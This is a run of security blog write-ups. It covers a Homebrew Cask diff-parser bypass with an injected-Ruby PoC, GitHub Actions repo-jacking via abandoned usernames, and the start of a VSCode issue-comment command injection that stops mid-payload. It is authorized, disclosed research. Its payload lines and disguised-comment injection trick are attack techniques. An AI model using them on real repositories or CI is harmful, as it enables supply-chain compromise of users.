前述の通り、git_diffは+++ \u0026quot;?b/(.*)にマッチする変更を行追加ではなく変更中のファイル情報として扱うため、このDiffはCasks/iterm2.rbに対して0行の変更を加えるものとして扱われてしまう。\nこの変更を加えた上でプルリクエストを作成8し、脆弱性のデモンストレーションを開始した。\n問題発生 その後、しばらく待ってもプルリクエストがマージされず、なぜかと思いCIの実行ログを確認すると、Required status checks for pull request 104191 are not successful.というログが出力されていた。\n失敗しているチェックを洗い出した所、brew styleを実行してコードの構文チェックを行っており、この部分で実行されるRubocopがコードが汚いと怒っていることがわかった。\nRubocopは# rubocop:disable allというコメントを行末尾に追加することにより、特定の行に対しての警告を無効化することができる。\n一行目に関してはこれを追記するだけで済んだのだが、二行目は+++ \u0026quot;?b/(.*)のグルーピングされている部分にマッチする文字列がCasks/iterm2.rbである必要があったため、このコメントを追加することによる解決はできなかった。　いくつかの試行錯誤の後、以下のような変更を加えることにより最後の行を変更せずにRubocopを黙らせることが可能であることがわかった。\n++ \u0026quot;b/#{puts 'Going to report it - RyotaK (https://hackerone.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end; }\u0026quot; # rubocop:disable all ++ \u0026quot;b/\u0026quot; if # rubocop:disable all ++ b/Casks/iterm2.rb  二行目でifを追加し、次の行をif式として評価させることによりOperator / used in void context.という警告が出ないように調整している。\nこれにより、プルリクエストに対して実行されているチェックが全て成功するようになり、無事にBrewTestBotによってプルリクエストがマージされた。\n問題発生、再び 無事にプルリクエストがマージされたため、brew install iterm2 --caskを実行し、Going to report it - RyotaK (https://hackerone.com/ryotak)が出力されることを確認し、PoCとして画像を送信した。\nその後、送信したレポートに対する返信を待っている間に、以下のようなリプライがTwitter上で送られてきた。\n@ryotkak - do you take credit for my #homebrew behaviour? :) pic.twitter.com/CczRDTemu9\n\u0026mdash; mrkosmici (@mrkosmici) April 18, 2021  一瞬理解できなかったのだが、よく見るとbrew cleanupを実行した際にもGoing to report it - RyotaK (https://hackerone.com/ryotak)が表示されてしまっているようだった。\n慌てて手元で試すと、確かにbrew cleanup実行時にもGoing to report it - RyotaK (https://hackerone.com/ryotak)が表示されてしまっていた。\nこの時は非常に慌てていたため気が付かなかったのだが、後から調査した結果、brew cleanup以外にもbrew search等で変更したCaskが実行されてしまうことがわかった。\nどうやら、一部のコマンドを実行した際に全てのCaskを評価する設計になっていたため、対象のCaskをインストールしていなかったとしても、変更後のコードが実行されてしまう状態になっていたようだった。\n加えた変更がログを出力するのみだったこと、及びすぐに変更が巻き戻されたことにより大した影響はなかったが、このようなことが起きることを想定していなかったため、非常に焦った。\nまとめ 今回の記事では、HomebrewのOfficial Tapに存在した脆弱性について解説しました。\nこの脆弱性が悪用されていた場合、発覚するまでの間にbrewで特定の操作を行ったユーザー全員のコンピュータが侵害されることに繋がったと考えると、中央集権的なエコシステムに関する監査は必要不可欠だと感じました。\nPyPIやnpm registry等に対する脆弱性診断も行いたいとは思っているのですが、残念ながら脆弱性の診断行為を許可する旨が明示的に記載されていないため、現在の所行うことができません。\n本記事に関する質問はTwitter(@ryotkak)へメッセージを投げてください。\nタイムライン    日付 (日本時間) 出来事     2021/04/17 脆弱性の発見   2021/04/17 メンテナに対して連絡   2021/04/18 メンテナからの返信を受信   2021/04/18 17時頃 デモンストレーションを開始   2021/04/18 17時頃 レポートを送信   2021/04/18 18時頃 プルリクエストをマージさせることに成功   2021/04/18 19時頃 プルリクエストが巻き戻される   2021/04/18 20時頃 一次対応が完了   2021/04/19 二次対応が完了   2021/04/21 インシデントの開示      具体的に言うと、改善前のDead by Daylightのマッチ待ち時間ぐらい \u0026#x21a9;\u0026#xfe0e;\n また、Homebrewでは2018年にGitHub API Tokenの漏洩に関連したインシデントが発生していたため、所属メンバーの意識も高かったものと思われる。 \u0026#x21a9;\u0026#xfe0e;\n 直近3つの記事が全てGitHub Actionsに関連したものであることに関しては非常に申し訳ないと思っている。 (が、GitHub Actionsは攻撃対象領域として非常に優秀なのだ。) \u0026#x21a9;\u0026#xfe0e;\n https://github.com/Homebrew/actions/blob/bac0cf0eef64950c5fa7b60134da80f5f52d87ab/.github/workflows/review-cask-pr.yml \u0026#x21a9;\u0026#xfe0e;\n 発見した脆弱性に重要でない条件は省略したが、他にも多数の条件が存在した。 詳しくは https://github.com/Homebrew/actions/blob/bac0cf0eef64950c5fa7b60134da80f5f52d87ab/.github/workflows/review-cask-pr.yml を確認してほしい。 \u0026#x21a9;\u0026#xfe0e;\n 二行目が文字列リテラルになっていないのは意図的であり、git_diffのバグにより文字列リテラルを閉じた際のダブルクオーテーションもファイルパスとして扱われてしまうためである。 \u0026#x21a9;\u0026#xfe0e;\n この時点では、各Caskファイルはbrew installを実行した際にしか実行されないと思っていたため、メンテナと連絡が取れている状況を鑑み、すぐに取り消せば実際に変更したコードを実行するユーザーは発生しないと考えていた。 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/Homebrew/homebrew-cask/pull/104191 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-04-21","permalink":"https://blog.ryotak.me/post/homebrew-security-incident/","tags":["Homebrew","脆弱性","Ruby","Supply Chain"],"title":"HomebrewのCaskリポジトリを介した任意コード実行"},{"content":"この記事は日本語でも投稿されています: https://blog.ryotak.me/post/homebrew-security-incident/\n(もし日本語が読める場合、筆者は英語がそこまで得意ではないため、日本語の記事を読むことをお勧めします。)\n(Official blog post about this incident is available here: https://brew.sh/2021/04/21/security-incident-disclosure/)\nPreface Homebrew project is running a \u0026ldquo;Vulnerability Disclosure Program\u0026rdquo; on HackerOne, which allows hackers to perform the vulnerability assessment.\nThis article describes a vulnerability assessment that is performed with permission from the Homebrew project\u0026rsquo;s staff and is not intended to recommend you to perform an unauthorized vulnerability assessment.\nIf you found any vulnerabilities in Homebrew, please report it to Homebrew project\u0026rsquo;s vulnerability disclosure program.\nTL;DR In the Homebrew/homebrew-cask repository, it was possible to merge the malicious pull request by confusing the library that is used in the automated pull request review script developed by the Homebrew project.\nBy abusing it, an attacker could execute arbitrary Ruby codes on users' machine who uses brew.\nReason to investigate One afternoon, I had a slight time before my next appointment1, so I decided to look for an interesting program on HackerOne.\nAs I wanted to find a vulnerability in the software/services I was using, I looked around on my PC, and the brew command caught my eyes.\nThen, I remembered that I saw a program named Homebrew on HackerOne, so I decided to find the vulnerability in it.\nSelection of targets To select the target, I looked at the policy page of the vulnerability disclosure program. And I noticed that Homebrew/homebrew-* repository is in scope.\nAs I\u0026rsquo;m not good at reading complicated Ruby codes, I decided to find a vulnerability in Homebrew/homebrew-*.\nInitial investigation I think the following two vulnerabilities are common in GitHub repositories:\n Leakage of API tokens that has permission against the repository Vulnerabilities in the CI script that is used by the repository  So, I started to check these 2 vulnerability types on repositories that are in scope.\nTo check the first vulnerability, I cloned all repositories created by the member of Homebrew and scanned a token-like string.\nHowever, as GitHub has a feature to scan for leaked tokens, this type of vulnerability is not common these days. And as expected, I couldn\u0026rsquo;t find any valid tokens.2\nThen, I started to read codes to check the second one.\nInvestigation of CI scripts Homebrew project uses GitHub Actions to run the CI scripts. 3\nSo I looked into the .github/workflows/ directory of each repository.\nAfter reviewing some repositories, I was very interested in review.yml and automerge.yml of Homebrew/homebrew-cask.\nIt looks like review.yml checks the contents of the user-submitted pull request, and if that pull request is simple enough (e.g. Bumps version), it\u0026rsquo;ll approve these pull requests.\nAfter that, automerge.yml automatically merges approved pull requests.\nInvestigation of review.yml The ruby script used by review.yml4 fetches pull request contents as a diff file and parses it with git_diff Gem.\nAnd then, it\u0026rsquo;ll approve the pull request only if all conditions below are met:\n Modifying only 1 file Not moving/creating/deleting file Target filepath matches \\ACasks/[^/]+\\.rb\\Z Line count of deletions/additions are same All deletions/additions matches /\\A[+-]\\s*version \u0026quot;([^\u0026quot;]+)\u0026quot;\\Z/ or \\A[+-]\\s*sha256 \u0026quot;[0-9a-f]{64}\u0026quot;\\Z No changes to format of versions (e.g. 1.2.3 =\u0026gt; 2.3.4)  \u0026hellip; etc5\nI scrutinized the conditions above, but I couldn\u0026rsquo;t find any flaws in them. So I concluded it\u0026rsquo;s not possible to inject arbitrary codes in these conditions. After that, I was checking other scripts for a while, but for some reason, I couldn\u0026rsquo;t forget about this script.\nSo I decided to dig into this script and started looking at the library that parses the diff file.\nInvestigation of git_diff While I was looking into git_diff repository, I found an issue that reports wrong parsing of changed lines count.\nAfter seeing this issue, I started wondering if I could somehow confuse git_diff and disguise the pull request to meet the above conditions.\nIt seemed that git_diff did the following to parse the diff file:\n Split the contents of the file with line breaks For each line, check if ^diff --git(?: a/(\\S+))?(?: b/(\\S+))? matches, and if so, replace the file information currently being processed with the one that matches the regular expression. If step 2 didn\u0026rsquo;t match, check if it matches one of the following regular expressions and if it matches, replace the file path information of the source/destination according to the contents.  If step 3 didn\u0026rsquo;t match, treat it as a change to the file content, consider it as an addition if it starts with +, and deletion if it starts with -, otherwise consider it as the original file content without modifications. Repeat the steps above and finish once all the lines are processed.  These processes seem to be okay at first glance, but it was possible to change the source/destination file path information multiple times in step 3.\nThe diff file generated by GitHub will be the following format:\ndiff --git a/source file path b/destination file path index parent commit hash..current commit hash filemode --- a/source file path +++ b/destination file path @@ line information @@ Details of changes (e.g.: `+asdf`,`-zxcv`)  Additional lines will be represented by prepending \u0026ldquo;+\u0026rdquo; to the line.\nThis means if the added line matches ++ \u0026quot;?b/(.*), it\u0026rsquo;ll be treated as a file path information rather than the change against file contents.\nAnd by checking the required conditions above, I noticed that the required condition for the file path being changed is only \\ACasks/[^/]+\\.rb\\Z.\nAs mentioned above, the file path information can be changed multiple times, so the above conditions can be bypassed by making the following changes, and the pull request will be treated as a harmless pull request with 0 line changes. 6\n++ \u0026quot;b/#{Arbitrary codes here}\u0026quot; ++ b/Casks/cask.rb  Preparing for the demonstration As bug bounty platforms such as HackerOne require PoC/demonstration in the report, I decided to demonstrate this vulnerability.\nSince it\u0026rsquo;s not a good idea to modify the casks that are being used without permission, I tried to find a test cask in the homebrew-cask repository.\nHowever, I couldn\u0026rsquo;t find it. So I contacted the Homebrew staff who operates the vulnerability disclosure program on HackerOne.\nAfter that, I received I can’t add a test cask just for this but you could try to make a harmless modification to an existing cask perhaps? from the staff.\nTherefore, I chose a random cask and decided to make harmless changes.\nDemonstrating the vulnerability Since I saw a pull request that inadvertently posted an API Token on GitHub, I decided to make changes to iterm2.rb that this pull request was trying to update.\nBefore adding the modification, I noticed that ++ b/Casks/iterm2.rb would throw an error if these variables are not defined.\nSo I forked Homebrew/homebrew-cask and added the following 2 lines to Casks/iterm2.rb.7\n++ \u0026quot;b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}\u0026quot; ++ b/Casks/iterm2.rb  By defining b,Casks,iterm2,iterm2.rb in the first line, the second line won\u0026rsquo;t throw an error. Therefore, it can be executed as a valid Ruby script.\nAlso, by adding these changes, GitHub will return the following diff:\ndiff --git a/Casks/iterm2.rb b/Casks/iterm2.rb index 3c376126bb1cf9..ba6f4299c1824e 100644 --- a/Casks/iterm2.rb +++ b/Casks/iterm2.rb @@ -8,6 +8,8 @@ sha256 \u0026quot;e7403dcc5b08956a1483b5defea3b75fb81c3de4345da6000e3ad4a6188b47df\u0026quot; end +++ \u0026quot;b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}\u0026quot; +++ b/Casks/iterm2.rb url \u0026quot;https://iterm2.com/downloads/stable/iTerm2-#{version.dots_to_underscores}.zip\u0026quot; name \u0026quot;iTerm2\u0026quot; desc \u0026quot;Terminal emulator as alternative to Apple's Terminal app\u0026quot;  As mentioned above, git_diff treats lines that match +++ \u0026quot;?b/(.*) as file path information rather than added lines, so this diff will be treated as a pull request that making a change of 0 lines.\nAfter making this change, I made a pull request8 and started demonstrating the vulnerability.\nProblem occurred Even after waiting for a while, the pull requests were not merged, and when I checked the CI execution log, I noticed Required status checks for pull request 104191 are not successful. in the output.\nBy looking into failed checks, I confirmed that a workflow that uses brew style was failed, which means Rubocop rejected the changes.\nRubocop allows source codes to disable its feature by adding # rubocop:disable all at the end of the line.\nThe first line could be fixed by adding the comment, but the second line couldn\u0026rsquo;t.\nAs the second line must return Casks/iterm2.rb in the capturing group of +++ \u0026quot;?b/(.*), it can\u0026rsquo;t be fixed by just adding the comment.\nAfter some tries, it turned out that it was possible to ignore Rubocop without changing the last line by making the following changes:\n++ \u0026quot;b/#{puts 'Going to report it - RyotaK (https://hackerone.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end; }\u0026quot; # rubocop:disable all ++ \u0026quot;b/\u0026quot; if # rubocop:disable all ++ b/Casks/iterm2.rb  By adding if in the second line and letting the next line evaluate as an if expression, it was possible to fix the Operator / used in void context. warning.\nSince all checks on the pull request were successfully run, BrewTestBot merged my pull request.\nProblem occurred\u0026hellip; again As the pull request merged successfully, I executed brew install iterm2 --cask and confirmed that Going to report it - RyotaK (https://hackerone.com/ryotak) were printed. Then send an image as a PoC in the report.\nAfter that, while waiting for a reply to the report I sent, I received the following reply on Twitter.\n@ryotkak - do you take credit for my #homebrew behaviour? :) pic.twitter.com/CczRDTemu9\n\u0026mdash; mrkosmici (@mrkosmici) April 18, 2021  I couldn\u0026rsquo;t understand it for few seconds, but somehow brew cleanup prints Going to report it - RyotaK (https://hackerone.com/ryotak) too.\nWhen I tried it in my machine in a hurry, I could confirm that Going to report it - RyotaK (https://hackerone.com/ryotak) was displayed even when brew cleanup was executed.\nI didn\u0026rsquo;t notice it because I was in a hurry at this time, but as a result of investigating later, I found that a modified cask was executed if someone executed brew search etc. in addition to brew cleanup.\nIt was designed to evaluate all casks when some commands were executed, so even if the target cask was not installed, the modified code will be executed.\nAs the only changes I made were to print additional logs, and maintainers reverted the changes immediately, this didn\u0026rsquo;t have much impact.\nHowever, I was very surprised because I didn\u0026rsquo;t expect this to happen.\nConclusion In this article, I described the vulnerability that was existed in the Homebrew\u0026rsquo;s official tap.\nIf this vulnerability was abused by a malicious actor, it could be used to compromise the machines that run brew before it gets reverted. So I strongly feel that a security audit against the centralized ecosystem is required.\nI want to perform security audits against PyPI/npm registry\u0026hellip; etc, but as they don\u0026rsquo;t allow the vulnerability assessment explicitly, I can\u0026rsquo;t do this.\nIf you have any comments/questions about this article, please send me a message on Twitter(@ryotkak).\nTimeline    Date (JST) Event     April 17, 2021 Found the vulnerability   April 17, 2021 Sent an email to the maintainer   April 18, 2021 Received a response from the maintainer   April 18, 2021 5 pm Started the demonstration   April 18, 2021 5 pm Sent a report   April 18, 2021 6 pm Successfully merged the pull request   April 18, 2021 7 pm Pull request was reverted   April 18, 2021 8 pm Primary fix completed   April 19, 2021 Secondary fix completed   April 21, 2021 Incident has been disclosed      Specifically, it\u0026rsquo;s about the same as the Dead by Daylight match wait time before improvement. \u0026#x21a9;\u0026#xfe0e;\n Also, Homebrew had an incident related to the leakage of GitHub API Token in 2018, so it seems that the awareness of the members was high enough. \u0026#x21a9;\u0026#xfe0e;\n I\u0026rsquo;m sorry that the last three articles are all related to GitHub Actions. (But GitHub Actions is a very good attack surface.) \u0026#x21a9;\u0026#xfe0e;\n https://github.com/Homebrew/actions/blob/bac0cf0eef64950c5fa7b60134da80f5f52d87ab/.github/workflows/review-cask-pr.yml \u0026#x21a9;\u0026#xfe0e;\n I omitted the conditions that are not important to the vulnerabilities I found, but there were many other conditions. For details, please check https://github.com/Homebrew/actions/blob/bac0cf0eef64950c5fa7b60134da80f5f52d87ab/.github/workflows/review-cask-pr.yml \u0026#x21a9;\u0026#xfe0e;\n It is intentional that the second line is not a string literal, because of another bug in git_diff, it doesn\u0026rsquo;t ignore double quotes when closing a string literal. \u0026#x21a9;\u0026#xfe0e;\n At this point, I thought that each cask file will be executed only if it was specified in brew install. Given the situation in which the maintainer was in contact, I thought that if it got reverted immediately, no user would execute the modified code. \u0026#x21a9;\u0026#xfe0e;\n https://github.com/Homebrew/homebrew-cask/pull/104191 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-04-21","permalink":"https://blog.ryotak.me/post/homebrew-security-incident-en/","tags":["Homebrew","Vulnerability","Ruby","Supply Chain"],"title":"Remote code execution in Homebrew by compromising the official Cask repository"},{"content":"はじめに GitHubはBug Bountyプログラムを実施しており、その一環として脆弱性の診断行為をセーフハーバーにより許可しています。\n本記事は、そのセーフハーバーの基準を遵守した上で調査を行い、結果をまとめたものであり、無許可の脆弱性診断行為を推奨することを意図したものではありません。\nGitHub上で脆弱性を発見した場合は、GitHub Security Bug Bountyへ報告してください。\n要約 GitHub Actionsの仕様上、デフォルトではサプライチェーン攻撃に対する適切な保護が行われないため、特定の条件を満たしたリポジトリを侵害することが出来る。\nこの問題の影響を受けるリポジトリがどの程度存在するかを調査した所、yay等の広く使われているソフトウェアのリポジトリを含めた多数のリポジトリがこの攻撃に対して脆弱であることがわかった。\n調査理由 GitHub Actionsを使ったDDoSに巻き込まれたという記事を読み、以前から調査したいと考えていたサプライチェーン攻撃に関連した調査をGitHub Actionsで行うことを思いついたため、調査内容を考え初めた。\n過去にRepo Jacking: Exploiting the Dependency Supply Chainという記事を読んでおり、追加の検証無しにリポジトリを直接参照している場合、サプライチェーン攻撃が刺さりやすくなる事を知っていたため、GitHub Actionsのuses構文が同様の挙動をするかどうか確認した。\nその結果、同様の挙動をすることがわかったため、本調査を実施することにした。\n脆弱なサプライチェーン GitHub Actionsには、usesという他のユーザーが作成したActionのリポジトリを指定し、ワークフロー内に組み込むことが出来る構文が存在する。\nこの機能では、デフォルトで整合性チェックが行われておらず、結果として参照先のActionが改竄されていたとしても正常に処理が実行されてしまう。\n参照先のActionが書き換えられた場合、ワークフローの発火元のイベントがpull_request以外であれば1、Action側が参照するシークレットを指定できるため2、書き込み権限を持つGITHUB_TOKENの窃取に繋がり、結果としてリポジトリを侵害することが可能となる。\nこれは、サプライチェーンの保護という観点においては推奨されるものではない。 (例として、Goでは依存関係の整合性チェックを行っている。)\nGitHubのリポジトリリダイレクト また、この問題を深刻化させている機能に、リポジトリリダイレクトが挙げられる。\nこれは、リポジトリのオーナーがリポジトリ名やユーザー名を変更した後、元のユーザー名とリポジトリ名を使用した参照を行う際に自動でリダイレクトする機能で、これによりActionを提供している開発者がGitHubのユーザー名を変更した後も、そのActionを使用しているワークフローは動作し続ける。\nしかしながら、このリダイレクトは攻撃者が簡単に制御することが可能となっている。\n攻撃者は、リポジトリオーナーの元々のIDを取得し、同名のリポジトリを作成することによりこのリダイレクトを止め、攻撃者が制御するリポジトリを参照するように変更することができる。\nこれにより、Actionを公開している開発者がユーザー名を変更した後、ワークフローが参照しているActionが移動したことに気がつけず、長期間に渡ってリポジトリが脆弱な状況に置かれる可能性が高まる。\n調査 前述の通り、Actionを公開している開発者がユーザー名を変更した後、それが検出されずに放置されている可能性がある程度存在する。\nその状態になっているリポジトリを検出するため、以下の検索クエリにマッチするワークフローファイルの取得をコード検索APIから試みた。\npath:.github/workflows language:yaml uses  調査時点で919,249件のファイルが上記の条件にマッチしたが、GitHubは検索結果の最初の1000件のみを返すため、全件取得ができない。\nそのため、sizeクエリパラメータを用い、検索APIから取得できるデータ数を可能な限り増やした。\nこれにより、810,177件のワークフローを取得することができた。\nまた、このエンドポイントはファイルの内容をレスポンスに含めないため、ワークフローを解析するためには別のエンドポイントを叩く必要があった。\nしかしながら、810,177件のファイルを普通に取得しようとすると、APIのレートリミットによりかなりの時間がかかり、現実的な時間内に終わらない可能性がある。\nそこで、GraphQL APIを用いて、一回のリクエストで200個ほどのクエリを実行することによりこの問題を解決した。\nquery{ query1: repository(owner:\u0026quot;owner_name\u0026quot;,name:\u0026quot;repository_name\u0026quot;){ content: object(expression:\u0026quot;ref:filepath\u0026quot;){ ... on Blob{ text } } } query2: repository(owner:\u0026quot;owner_name\u0026quot;,name:\u0026quot;repository_name\u0026quot;){ content: object(expression:\u0026quot;ref:filepath\u0026quot;){ ... on Blob{ text } } } ... }  それぞれのワークフローを簡単なスクリプトで解析した結果、以下のような内訳になった。\n   件数 概要     699170 actions/のActionを除いたユニークなuses   5462 無効なYAML形式    この結果を元に、Action所有者のユーザー名が存在するかどうかを確認した。\nユーザーの存在確認は、以下のGraphQLクエリを実行し、結果がnullであれば存在しないといった形で確認することができる。\nquery{ repositoryOwner(login:\u0026quot;owner_id\u0026quot;){ id } }  結果として、118個のユーザー名が一つ以上のワークフローにより使用されているにも関わらず、登録可能な状態になっている事がわかった。 (これらのユーザー名はGitHubによって保護される予定となっている。3)\nこれらのユーザーが公開しているActionを使用しているリポジトリを調べた所、AUR Helperのyay4等、有名なリポジトリを含む多くのリポジトリに影響を及ぼしていた。\nまた、プライベートリポジトリが普及している現状を考えると、この問題は今回判明した以上の影響を持っていると考えられる。\n軽減策 この問題は、ユーザーによりある程度軽減することができる。\n以下に軽減策を効果が高いと思われる順番に並べた。\n Actionをワークフローと同じリポジトリに含める: ユーザー名の変更などにより影響を受けず、Actionを書き換えることが可能なユーザーであれば直接ワークフローを変更できるため、これは最も効果的な軽減策だと思われる。 Actionをフォークし、フォークした物をワークフローから参照する: 他のユーザーの名前変更による影響を受けなくなる軽減策だが、自分がユーザー名を変更した際にワークフローの書き換えを忘れると依然として脆弱になる。 Actionの指定をコミットハッシュと共に行う: これは、GoogleがSHA-1の衝突に成功したことを考えると、完全に安全な軽減策ではないと考えられる。しかしながら、依然として攻撃を困難にすることが可能となる。  まとめ 今回の記事では、GitHub Actionsの仕様上の問題がどのようにしてリポジトリの侵害につながるかと、その影響範囲の調査結果を紹介しました。\nこの問題に関しては、GitHubにも報告しましたが、「将来的に挙動を変更する計画はあるが、現時点でそれ以上の情報はない」という返信が来たため、現在の所ユーザーが適切な設定を行うことが重要となっています。\nもしこの記事を読んでいる方がGitHub Actionsを使用しており、かつuses構文を用いて他人のActionを使用している場合は、今一度設定を見直して欲しいと思います。\n本記事に関する質問はTwitter(@ryotkak)へメッセージを投げてください。\nタイムライン    日付 出来事     2021/02/05 22:48 ファイル一覧取得開始   2021/02/06 07:05 ファイル一覧取得完了   2021/02/07 10:08 ファイル内容の取得並びに解析開始   2021/02/07 18:24 ファイル内容の取得並びに解析完了   2021/02/07 19:11 ユーザーの存在状況確認開始   2021/02/07 19:58 ユーザーの存在状況確認完了   2021/02/08 18:43 影響を受けるリポジトリの特定   2021/02/08 22:21 GitHubに問題の報告と開示許可の要請   2021/02/12 02:24 GitHubからの返信並びに開示許可が出る   2021/02/25 12:30 本記事の公開      https://docs.github.com/en/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token \u0026#x21a9;\u0026#xfe0e;\n https://github.com/actions/checkout/blob/61b9e3751b92087fd0b06925ba6dd6314e06f089/action.yml#L12-L24 \u0026#x21a9;\u0026#xfe0e;\n 記事公開より前にGitHubがこれらのユーザー名の保護を行うはずだったが、なぜか現時点で保護されていないため、ユーザー名一覧並びにリポジトリ一覧の公開ができなかった。 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/Jguer/yay/issues/1468 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-02-25","permalink":"https://blog.ryotak.me/post/github-actions-supplychain/","tags":["GitHub","脆弱性","GitHub Actions","Supply Chain"],"title":"GitHub Actionsにおけるサプライチェーン攻撃を介したリポジトリ侵害"},{"content":"はじめに Microsoftは脆弱性の診断行為をセーフハーバーにより許可しています。\n本記事は、そのセーフハーバーを遵守した上で発見/報告した脆弱性を解説したものであり、無許可の脆弱性診断行為を推奨する事を意図したものではありません。\nMicrosoftが運営/提供するサービスに脆弱性を発見した場合は、Microsoft Bug Bounty Programへ報告してください。\n要約 VSCodeのIssue管理機能に脆弱性が存在し、不適切な正規表現、認証の欠如、コマンドインジェクションを組み合わせることによりVSCodeのGitHubリポジトリに対する不正な書き込みが可能だった。\n発見のきっかけ 電車に乗っている際にふと思い立ってmicrosoft/vscodeを眺めていた所、CI用のスクリプトが別のリポジトリ(microsoft/vscode-github-triage-actions)にまとめられていることに気がついた。\n非常に暇だったのでそのスクリプトを眺めていた際に、以下のようなコードを発見した1:\nexec(`git -C ./repo merge-base --is-ancestor ${commit} ${release}`, (err) =\u0026gt; { [...] }),  commit変数またはrelease変数に任意の入力ができれば、コマンドインジェクションができるな、と思い追加で調査することにした。\nコードを読む 電車の中でPCを広げるわけにもいかないため、スマホでGitHubの検索機能を用いてコードを読むことにした。\n上記のコマンドインジェクションができそうな処理を含む関数の名前がreleaseContainsCommitだったため、そのまま検索すると5件の検索結果が帰ってきた。\nその内1件がテスト用のコード2、2件が上記の関数の定義3、2件がこの関数を使用しているコード4だった。\nこれらのコードの流れを軽く追ってみると、特定の条件5を満たすIssue内でそのIssueをクローズする要因となったコミットハッシュをgetClosingInfo関数より取得し、releaseContainsCommitへ渡していた。6(上記のcommit変数)\n不適切な正規表現 getClosingInfo関数では、Issueをクローズする際にコミットを関連付けし忘れた場合でも問題なくIssueの管理を続けられるように、\\closedWithというコマンドを用意していた7。\nこのコマンドは、\\closedWith コミットハッシュといったような形式のコメントをIssueに対して追加することにより、特定のコミットハッシュをIssueと関連付けることができるのだが、このコマンドをコメント内から検索する正規表現8に問題があった。\n/(?:\\\\|\\/)closedWith (\\S*)/  この正規表現は、\\closedWith または/closedWith で始まり、その後ホワイトスペースが出てくるまでの文字列にマッチする。\nここでは、\\closedWith コミットハッシュというコマンドにのみマッチすればよかったため、\\Sの部分を[a-fA-F0-9]にするべきだった。\nまた、この正規表現は文頭に\\closedWith がある必要がないため、Issueのコメントのどこかに\\closedWith という文字列を含められればコマンドとして認識されてしまう。\nそのため、\u0026lt;!-- \\closedWith コミットハッシュ --\u0026gt;といったようなコメントをされた際に、コマンドを実行されたと認識できずにコマンドが実行されてしまう恐れがあった。\n認証の欠如 また、この関数内では本来行われるべき権限の確認が行われていなかった。\nmicrosoft/vscodeリポジトリ内では、以下のような形で\\closedWithコマンドを実行できるユーザーを絞っていた9が、この認証の欠如により権限を持たないユーザーがコミットの関連付けを行える状態となってしまっていた。\n{ \u0026quot;type\u0026quot;: \u0026quot;comment\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;closedWith\u0026quot;, \u0026quot;allowUsers\u0026quot;: [ \u0026quot;cleidigh\u0026quot;, \u0026quot;usernamehw\u0026quot;, \u0026quot;gjsjohnmurray\u0026quot;, \u0026quot;IllusionMH\u0026quot; ], \u0026quot;action\u0026quot;: \u0026quot;close\u0026quot;, \u0026quot;addLabel\u0026quot;: \u0026quot;unreleased\u0026quot; },  脆弱性を突けるか これらの脆弱性を用いることにより、\\closedWithコマンドの引数にある程度任意の内容が渡せ、その入力をコマンドインジェクションが存在する箇所へと渡せることがわかった。\nつまり、特定の条件5を満たすIssueに対して\\closedWith `ここにコマンド` といったようなコメントを行えばGitHub Actions内で任意のコマンドを実行できるのだが、Issueが以下の検索クエリのどちらかに引っかかる必要があり、ラベル付けを行う権限が無い一般ユーザーが能動的に脆弱性を突くのは厳しい可能性があった。\n`is:closed label:${this.notYetReleasedLabel}`  `is:closed label:${this.pendingReleaseLabel} label:${this.authorVerificationRequestedLabel}`  また、脆弱性が存在するauthor-verifiedスクリプト及びrelease-pipelineスクリプトを使用しているワークフローは3つ10あったが、そのうち2つは特定のラベルがIssueについている状態でそのIssueがクローズされた際や、Issueにラベル付けされた際などに発火するもので、能動的な悪用が困難な状態だった。\nしかしながら、最後の一つ11はscheduleでワークフローを発火させており、毎日14時20分(UTC)になると以下のクエリに合致するIssueに対して上記の関連コミット検索が行われるように設定されていた。\nis:closed label:awaiting-insiders-release label:author-verification-requested  この条件に合致するIssueを検索した所、脆弱性の調査時点で一件のIssue12が該当することがわかった。\nこのIssueを用いることにより、脆弱性を突けることがわかったため、実際に突いてみることにした。\n脆弱性を突く 前述の通り、\\closedWith `コマンド` のようなコメントを書き込むことにより脆弱性を突くことが出来る。\nしかしながら、対象のIssueは公開されている状態であり、そのまま書き込んでしまうと他のユーザーに脆弱性の概要を把握され、悪用されてしまう可能性があった。\nそのため、文中のどこかに\\closedWithが含まれていればいいという挙動を利用し、普通のコメントに偽装して脆弱性を突くことにした。\nDoes the next version fix this issue? \u0026lt;!-- \\closedWith `ここにコマンド` --\u0026gt;  また、このタスクが実行されるのが14時20分(UTC)であり、JSTに直すと23時20分であるため、とても眠い中作業をすることになる可能性があった。\nそのため、眠気による事故が起きないよう予め脆弱性を突いた後の動きをある程度決めてから行うことにした。（実際めっちゃ眠かった)\n影響の特定 予め動きを決めておくためには、この脆弱性を突くことにより発生し得る影響を特定しなければならない。\n幸いにも、CI内で使用されているスクリプト郡は全てGitHub上でホストされているため、実際に脆弱性を突く前にある程度正確な影響を把握することができた。\nまず大前提として、GitHub Actionsはpull_requestイベント以外ではsecrets.GITHUB_TOKENにリポジトリに対する書き込み権限を持ったGitHub Access Tokenをセットする13。\n次に、actions/checkoutはデフォルトでディスク上にsecrets.GITHUB_TOKENを残す14。\n最後に、actions/checkoutを実行した後のステップではディスク上にsecrets.GITHUB_TOKENが残っている。\nこれにより、actions/checkoutを実行した後のステップで任意のコードを実行できた場合、発火元のイベントがpull_requestでなければGitHub Actionsを実行しているリポジトリに対して書き込み権限を得ることが出来る。\n計画 ここまでの考えに至った後、実際に作業状態になったのが大体18時頃だったため、ご飯を食べてお風呂に入る時間を除くと約4時間ほどで計画を練る必要があった。\n作業を行う準備を終えた後、まず初めに、Issueのコメントで使用するPayloadを考えた。\nGitHubのMarkdownのパース仕様上、コメントアウトの中では--が使えず、また正規表現によりホワイトスペースが使用できないため、最終的なPayloadは以下のようになった。(冗長な所があると思うが、時間がなかったので許してほしい)\nDoes the next version fix this 